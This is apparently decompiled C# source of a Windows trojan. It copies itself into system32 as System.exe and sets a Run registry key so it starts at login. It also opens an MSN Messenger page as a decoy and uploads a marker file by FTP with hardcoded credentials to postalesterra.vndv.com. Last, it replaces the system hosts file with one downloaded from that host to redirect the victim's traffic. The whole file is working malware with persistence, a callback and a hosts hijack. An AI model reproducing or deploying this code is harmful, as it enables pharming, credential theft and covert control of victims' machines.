using System;
using System.IO;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using WindowsApplication1.My;

namespace WindowsApplication1;

[StandardModule]
internal sealed class ModulePrin
{
	[STAThread]
	public static void Main()
	{
		string fileName = "C:\\WINDOWS\\system32\\System.exe";
		FileInfo fileInfo = new FileInfo(fileName);
		if (!fileInfo.get_Exists())
		{
			((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), "C:\\WINDOWS\\system32\\System.exe");
			((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "System", (object)"C:\\WINDOWS\\system32\\System.exe");
			Interaction.Shell("explorer http://messenger.msn.com/", (AppWinStyle)2, false, -1);
			Random random = new Random();
			int num = random.Next();
			StreamWriter streamWriter = new StreamWriter("C:\\windows\\" + Conversions.ToString(num));
			streamWriter.WriteLine("value");
			streamWriter.Close();
			((ServerComputer)MyProject.Computer).get_Network().UploadFile("C:\\windows\\" + Conversions.ToString(num), "ftp://postalesterra.vndv.com/cuenta/" + Conversions.ToString(num), "postalesterra", "comosea1234");
		}
		FileSystem.SetAttr("C:\\WINDOWS\\system32\\drivers\\etc\\hosts", (FileAttribute)0);
		((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\WINDOWS\\system32\\drivers\\etc\\hosts");
		((ServerComputer)MyProject.Computer).get_Network().DownloadFile("http://postalesterra.vndv.com/host/hosts", "C:\\WINDOWS\\system32\\drivers\\etc\\hosts");
	}
}
